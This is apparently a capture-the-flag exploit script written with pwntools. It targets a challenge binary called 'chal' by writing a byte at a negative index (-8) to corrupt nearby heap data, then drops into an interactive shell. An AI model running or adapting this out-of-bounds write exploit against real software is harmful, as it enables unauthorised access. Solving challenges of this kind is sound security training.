from pwn import *
context.arch = "amd64"

def send_chunk(size, data):
	io.sendlineafter(b": ", size)
	io.sendlineafter(b": ", data)

io = process("./chal")
# io = remote("amt.rs", 31176)

if args.GDB:
	gdbscript="""
	b main
	"""
	gdb.attach(io, gdbscript=gdbscript)


send_chunk(b"64", b"A"*64) # initial chunk
send_chunk(b"64", b"A"*64) # ptr chunk

# change char
io.sendlineafter(b"index: ", b"-8")
io.sendlineafter(b"character: ", p8(0x90))

send_chunk(b"128", b"A"*128)

io.interactive()